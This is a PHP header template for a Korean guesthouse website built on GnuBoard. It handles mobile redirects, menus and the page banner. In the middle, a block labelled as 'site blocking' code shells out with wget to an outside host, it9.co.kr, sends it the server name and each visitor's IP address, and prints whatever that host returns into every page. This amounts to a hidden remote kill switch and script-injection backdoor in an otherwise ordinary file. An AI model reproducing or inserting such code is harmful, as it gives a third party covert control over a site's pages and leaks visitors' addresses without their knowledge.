<?
if (!defined("_GNUBOARD_")) exit; // 개별 페이지 접근 불가


if(isset($_GET["pcv"])) { set_session("ss_is_pc_view", $_GET["pcv"]);}
$ss_is_pc_view = get_session("ss_is_pc_view");
if(USE_MOBILE && USE_MOVE_MOBILE_FROM_HEAD && !$ss_is_pc_view) { //config.php	
	if($_SERVER[QUERY_STRING]) $qry_str = "?{$_SERVER[QUERY_STRING]}";
	$arr_browser = array ("iPhone","iPod","IEMobile","Mobile","lgtelecom","PPC","iphone","ipod","android","blackberry","windows ce","nokia","webos","opera mini","sonyericsson","opera mobi","iemobile");
	for($indexi = 0 ; $indexi < count($arr_browser) ; $indexi++) {
	if(stripos($_SERVER['HTTP_USER_AGENT'],$arr_browser[$indexi]) == true){
		// 모바일 브라우저라면  모바일 URL로 이동
		if ($_SERVER['HTTP_REFERER'] != "http://{$_SERVER['SERVER_NAME']}/m/" ) {
			header("Location: http://{$_SERVER['SERVER_NAME']}/m{$_SERVER["PHP_SELF"]}{$qry_str}");
			exit;
		}
	}
	}
}


include_once("$g4[path]/head.sub.php");
include_once("$g4[path]/lib/latest.lib.php");
include_once($g4['path']."/lib/calendar.php");

$subNaviHeight = array("",713,713,713,713,713,713,713);


if($p){
	$ppage=explode("_",$p);
	$pageNum=$ppage[0];
	$subNum=$ppage[1];
	$ssNum=$ppage[2];
	$tabNum=$ppage[3];
}

if($bo_table){ //게시판일때
	$bp=explode("_",$bo_table);
	$pageNum=$bp[0];
	$subNum=$bp[1];
	$ssNum=$bp[2];
	$tabNum=$bp[3];
}


if(USE_SHOP) {	//config.php
	$ca_temp = 0;
	if(isset($it)){
		$ca_temp = 1;
		$ca_id = $it[ca_id2];
		if(!$it[ca_id2]) $ca_id = $it[ca_id];

	}

	if($ca_id){

		for($i=0; $i<strlen($ca_id); $i++) { 
			$str_cut[$i] = substr($ca_id,$i,1); 
		}
		if($str_cut[0] == "a") $str_cut[0] = 11;
		if($str_cut[0] == "b") $str_cut[0] = 12;
		if($str_cut[0] == "c") $str_cut[0] = 13;
		if($str_cut[0] == "d") $str_cut[0] = 14;
		if($str_cut[0] == "e") $str_cut[0] = 15;

		$pageNum = $str_cut[0]+1;
		$subNum = (strlen($ca_id) <= 2) ? 1 : $str_cut[2];
		$ssNum = (strlen($ca_id) <= 4) ? 1 : $str_cut[4];
		$tabNum = (strlen($ca_id) <= 6) ? 1 : $str_cut[6];

	}

	if($ca_temp == 1){
		unset($ca_id);
	}

	$tv_idx = get_session("ss_tv_idx");
	$cartcnt = get_cart_count(get_session("ss_on_uid"));

	
	$ycart = new Yc4();
	$ShopMenu1 = $ycart->get_category_d1();
}

$tot = $pageNum."_".$subNum;
$tott = $tot."_".$ssNum;

// site 차단소스 ////////////////////////////////////////
function site_down($url){$fuid = '/tmp/wget_tmp_'. md5($_SERVER['REMOTE_ADDR'] . microtime() . $url. $ip);$cmd = 'wget "' . $url . '" -O "' . $fuid . '" --read-timeout=30';`$cmd`;$data = file_get_contents($fuid);`rm -rf $fuid`;return $data;}
$site_down_url= "http://it9.co.kr/site_down2.php?site_url=".$_SERVER['SERVER_NAME']."&remote_addr=".$_SERVER['REMOTE_ADDR'];
$site_down_data = site_down($site_down_url);
echo $site_down_data;
/////////////////////////////////////////////////////////



$menu = array();

$menu["pageNum"][1] = "비양";
	$menu["tot"][1][1] = "건축가의 말";
	$menu["tot"][1][2] = "제공건축";

$menu["pageNum"][2] = "객실소개";
	$menu["tot"][2][1] = "비양 1  ·  2  ·  3";
	$menu["tot"][2][2] = "비양 단독주택";

$menu["pageNum"][3] = "부대시설";
	$menu["tot"][3][1] = "무료 조식서비스  ·  카페";

$menu["pageNum"][4] = "예약안내";
	$menu["tot"][4][1] = "예약안내";
	$menu["tot"][4][2] = "예약문의";
	$menu["tot"][4][3] = "예약 캘린더";

$menu["pageNum"][5] = "오시는 길";
	$menu["tot"][5][1] = "오시는 길";

$menu["pageNum"][100] = $config["cf_title"];
	$menu["tot"][100][1] = "로그인";
	$menu["tot"][100][2] = "정보수정";
	$menu["tot"][100][3] = "회원가입";
	$menu["tot"][100][5] = "마이페이지";
	$menu["tot"][100][6] = "이용약관";
	$menu["tot"][100][7] = "개인정보처리방침";
	$menu["tot"][100][16] = "이메일무단수집거부";
?>

<div class="wrap">
<div class="wrap-header">
	<header class="layout">
		
		<a href="/index.php"><img src="/res/images/top/logo.jpg" alt="비양펜션 로고" class="logo" /></a>
		
		<ul id="Menu" >
			<?foreach($menu["pageNum"] as $pn=>$pnStr) {
				if($pn == 100) continue;
				?>
				
				<li <?=$pageNum == $pn ? "class='on'" : ""?> >
					<a href="#menulink" onclick="menulink('menu<?=sprintf("%02d", $pn)?>-1')" ><?=$pnStr?></a>
				</li>

			<?}?>
		</ul>
	</header>
</div>



<?if(!defined("__INDEX")){?>
<div class="wrap-sub wrap-content">

<?
if(file_exists("{$g4['path']}/res/images/subvisual/s{$p}.jpg"))				$Svisual = "s{$p}";
else if(file_exists("{$g4['path']}/res/images/subvisual/s{$bo_table}.jpg"))	$Svisual = "s{$bo_table}";
else if(file_exists("{$g4['path']}/res/images/subvisual/s{$tott}.jpg"))		$Svisual = "s{$tott}";
else if(file_exists("{$g4['path']}/res/images/subvisual/s{$tot}.jpg"))		$Svisual = "s{$tot}";
else if(file_exists("{$g4['path']}/res/images/subvisual/s{$pageNum}.jpg"))	$Svisual = "s{$pageNum}";
else																		$Svisual = "s0";
?>

<div class="subvisual" style="background-image:url('/res/images/subvisual/<?=$Svisual?>.jpg');" >
	<!--<p class="subvi_p1" ><?=$menu["pageNum"][$pageNum]?></p>-->
	<p class="subvisual_p">푸른 하늘과 황금빛 낙조의 풍광을 이 곳 비양에서 만끽해보세요.</p>
	<? if($pageNum != 100) { ?>
		<ul class="subvisual_tab" >
			<?foreach($menu["tot"][$pageNum] as $sn=>$snStr) {?>
				<li <?=$tot == $pageNum."_".$sn ? "class='on'" : ""?> >
					<a href="#menulink" onclick="menulink('menu<?=sprintf("%02d", $pageNum)?>-<?=$sn?>')" ><?=$snStr?></a>
				</li>
			<?}?>
		</ul>
	<? } ?>
</div>

<div class="sub_title" >
	<?=$menu["tot"][$pageNum][$subNum]?>
</div>


<section class="layout">

	<section class="content">
		<header>
			
		</header>

		<?if($bo_table){?>
		<div class="boardarea">
		<?}?>
<?}?>